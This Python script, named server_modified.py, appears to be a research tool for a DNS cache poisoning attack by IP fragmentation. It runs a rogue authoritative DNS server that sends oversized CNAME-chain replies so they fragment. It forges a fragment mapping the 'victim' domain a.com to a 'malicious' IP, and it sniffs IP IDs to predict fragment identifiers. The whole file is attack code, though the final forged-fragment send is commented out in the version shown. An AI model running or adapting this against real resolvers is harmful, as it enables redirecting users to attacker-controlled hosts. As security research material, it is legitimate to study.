# server_modified.py

#!/usr/bin/env python3

import socket
import re
import time
import threading
import os
# --- 1. Updated Scapy imports ---
# We need UDP, Raw, fragment, and send
from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, Raw, fragment, send, sniff, raw

# --- Configuration ---
HOST = '0.0.0.0'
PORT = 53
ATTACKER_DOMAIN = b'example.com' 
VICTIM_DOMAIN = 'a.com'
MALICIOUS_IP = '9.9.9.9'
FAKE_IP = '1.1.1.1'
OTHER_IP = '2.2.2.2'
CHAIN_LENGTH = 55
CHAIN_PREFIX = b'c'
RESPONSE_DELAY_SECONDS = 1 # Delay before responding with the first fragment
INTER_FRAGMENT_DELAY_MS = 1000 # Delay between adjacent fragments (milliseconds)
LOG_FILE = "/usr/local/etc/ipid_log.txt"
NETWORK_INTERFACE = "eth0"

# --- 2. Constants needed for fragmentation (borrowed from self-server.py) ---
MTU = 1500
IP_HEADER_LEN = 20
# Maximum IP payload size for subsequent fragments (MTU - IP header)
# This is the ideal fragsize to pass to the Scapy fragment() function
FRAG_PAYLOAD_SIZE = MTU - IP_HEADER_LEN


# --- DNS Response Logic (this part completely unchanged) ---

def build_oversized_response(request: DNS) -> bytes:
    qname = request.qd.qname
    answer_records_list = []
    answer_records_list.append(DNSRR(rrname=qname, ttl=3600, type='CNAME', rdata=f"{CHAIN_PREFIX.decode()}0.{ATTACKER_DOMAIN.decode()}".encode()))
    for i in range(CHAIN_LENGTH):
        answer_records_list.append(DNSRR(rrname=f"{CHAIN_PREFIX.decode()}{i}.{ATTACKER_DOMAIN.decode()}".encode(), ttl=3600, type='CNAME', rdata=f"{CHAIN_PREFIX.decode()}{i+1}.{ATTACKER_DOMAIN.decode()}".encode()))
    answer_records_list.append(DNSRR(rrname=f"{CHAIN_PREFIX.decode()}{CHAIN_LENGTH}.{ATTACKER_DOMAIN.decode()}".encode(), ttl=3600, type='A', rdata=FAKE_IP))

    ancount_val = len(answer_records_list)
    dns_header = DNS(id=request.id, qr=1, aa=1, rd=request.rd, ra=1, qd=request.qd, ancount=ancount_val)
    header_bytes = raw(dns_header)
    answer_bytes = b"".join([raw(rec) for rec in answer_records_list])
    return header_bytes + answer_bytes

def build_fake_response(request: DNS) -> bytes:
    qname = request.qd.qname
    answer_records_list = []
    answer_records_list.append(DNSRR(rrname=qname, ttl=3600, type='CNAME', rdata=f"{CHAIN_PREFIX.decode()}0.{ATTACKER_DOMAIN.decode()}".encode()))
    for i in range(CHAIN_LENGTH):
        answer_records_list.append(DNSRR(rrname=f"{CHAIN_PREFIX.decode()}{i}.{ATTACKER_DOMAIN.decode()}".encode(), ttl=3600, type='CNAME', rdata=f"{CHAIN_PREFIX.decode()}{i+1}.{ATTACKER_DOMAIN.decode()}".encode()))
    answer_records_list.append(DNSRR(rrname=f"{CHAIN_PREFIX.decode()}{CHAIN_LENGTH}.{ATTACKER_DOMAIN.decode()}".encode(), ttl=3600, type='A', rdata=FAKE_IP))

    answer_records_list[-1].rrname = f"{VICTIM_DOMAIN}".encode()
    answer_records_list[-1].rdata = MALICIOUS_IP
    answer_records_list[-2].rdata = f"{VICTIM_DOMAIN}".encode()
    answer_records_list[-2].rrname = f"0000000kxxxxx.{ATTACKER_DOMAIN.decode()}".encode()
    answer_records_list[-3].rdata = f"0000000kxxxxx.{ATTACKER_DOMAIN.decode()}".encode()

    ancount_val = len(answer_records_list)
    dns_header = DNS(id=request.id, qr=1, aa=1, rd=request.rd, ra=1, qd=request.qd, ancount=ancount_val)
    header_bytes = raw(dns_header)
    answer_bytes = b"".join([raw(rec) for rec in answer_records_list])
    return header_bytes + answer_bytes

def build_intermediate_cname_response(request: DNS, current_index: int) -> bytes:
    qname = request.qd.qname
    next_name = f"{CHAIN_PREFIX.decode()}{current_index + 1}.{ATTACKER_DOMAIN.decode()}".encode()
    return raw(DNS(id=request.id, qr=1, aa=1, rd=request.rd, ra=1, qd=request.qd, an=DNSRR(rrname=qname, type='CNAME', ttl=3600, rdata=next_name)))

def build_final_a_response(request: DNS) -> bytes:
    qname = request.qd.qname
    return raw(DNS(id=request.id, qr=1, aa=1, rd=request.rd, ra=1, qd=request.qd, an=DNSRR(rrname=qname, type='A', ttl=3600, rdata=OTHER_IP)))


# --- IPID Sniffer Logic (unchanged) ---

def log_packet_details(packet):
    if packet.haslayer(IP) and packet.haslayer(DNS):
        try:
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(packet.time))
            ip_id = packet[IP].id
            dns_tid = packet[DNS].id
            qname = packet[DNS].qd.qname.decode()
            log_line = f"[{timestamp}] IPID={ip_id:<5} | DNS_TID={dns_tid:<5} | QNAME={qname}\n"
            with open(LOG_FILE, 'a') as f:
                f.write(log_line)
        except Exception:
            pass

def start_sniffer(interface):
    print(f"[*] Starting IPID sniffer on interface '{interface}'...")
    bpf_filter = f"udp and src port {PORT}"
    sniff(iface=interface, filter=bpf_filter, prn=log_packet_details, store=0)


# --- Main Server ---

def main():
    # --- 3. Added root privilege check ---
    if os.geteuid() != 0:
        print("[!] ERROR: This script uses Scapy's send() function which requires root privileges.")
        print("[!] Please run as root or with 'sudo'. In Docker, ensure CAP_NET_ADMIN is added.")
        return

    try:
        with open(LOG_FILE, 'w') as f:
            f.write(f"--- IPID Log Initialized at {time.ctime()} ---\n")
        print(f"[*] Log file '{LOG_FILE}' has been cleared.")
    except IOError as e:
        print(f"[!] ERROR: Could not write to log file '{LOG_FILE}'. Details: {e}")
        return

    sniffer_thread = threading.Thread(target=start_sniffer, args=(NETWORK_INTERFACE,), daemon=True)
    sniffer_thread.start()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.bind((HOST, PORT))
        print(f"[*] Authoritative DNS server started on {HOST}:{PORT}...")
    except OSError as e:
        print(f"[!] ERROR: Could not bind to port {PORT}. Details: {e}")
        return

    cname_pattern = re.compile(b"^" + CHAIN_PREFIX + b"(\\d+)\\." + re.escape(ATTACKER_DOMAIN))

    while True:
        try:
            data, addr = sock.recvfrom(1024)
            request = DNS(data)

            if not (request.qd and ATTACKER_DOMAIN in request.qd.qname):
                continue
            
            qname = request.qd.qname
            print(f"\n[+] Received query from {addr} for: {qname.decode()}")
            
            response_bytes = None
            fake_bytes = None
            match = cname_pattern.match(qname)
            if match:
                index = int(match.group(1))
                if index == CHAIN_LENGTH: response_bytes = build_final_a_response(request)
                elif index < CHAIN_LENGTH: response_bytes = build_intermediate_cname_response(request, index)
            else:
                response_bytes = build_oversized_response(request)
                fake_bytes = build_fake_response(request)
                with open("act.hex", "wb") as file:
                    file.write(response_bytes)

            # --- 4. Core modification: replace sock.sendto() with Scapy fragmentation and delayed sending ---
            if response_bytes:
                print(f"    -> Preparing response. Initial delay: {RESPONSE_DELAY_SECONDS} second(s)...")
                time.sleep(RESPONSE_DELAY_SECONDS)

                dest_ip, dest_port = addr

                # test the payload fake packet
                # payload = None
                # with open("payload.hex", "rb") as thepayload:
                #     payload = thepayload.read()

                # Step A: Build a complete, unfragmented Scapy packet.
                # Scapy will calculate the correct checksum for the entire UDP payload at this step.
                full_packet = IP(dst=dest_ip) / UDP(sport=PORT, dport=dest_port) / Raw(load=response_bytes)
                fake_packet = IP(dst=dest_ip) / UDP(sport=PORT, dport=dest_port) / Raw(load=fake_bytes)
                # Step B: Use scapy.fragment() for fragmentation.
                # fragsize defines the data payload size of each IP packet (fragment).
                fragments = fragment(full_packet, fragsize=FRAG_PAYLOAD_SIZE)
                fake_fragments = fragment(fake_packet, fragsize=FRAG_PAYLOAD_SIZE)

                # fake_packet = IP(
                #     id=1,
                #     src='10.0.0.3',
                #     dst='10.0.0.2',
                #     proto=17,
                #     frag=(len(fragments[0].payload) // 8),
                # ) / Raw(payload)

                send(fragments[0], verbose=0)                
                print("      - Sending original fragment 2/2...")
                time.sleep(INTER_FRAGMENT_DELAY_MS / 1000.0)
                # send(fragments[1], verbose=0)
                # send(fake_fragments[1], verbose=0) # Send our own crafted packet
                # send(fake_packet, verbose=0)
                print(f"    -> All fragments sent. First fragment's IPID will be logged to '{LOG_FILE}'.")

        except Exception as e:
            print(f"[!] An error occurred while processing a request: {e}")

if __name__ == '__main__':
    if not NETWORK_INTERFACE:
        print("[!] ERROR: NETWORK_INTERFACE is not set. Please edit the script.")
    else:
        main()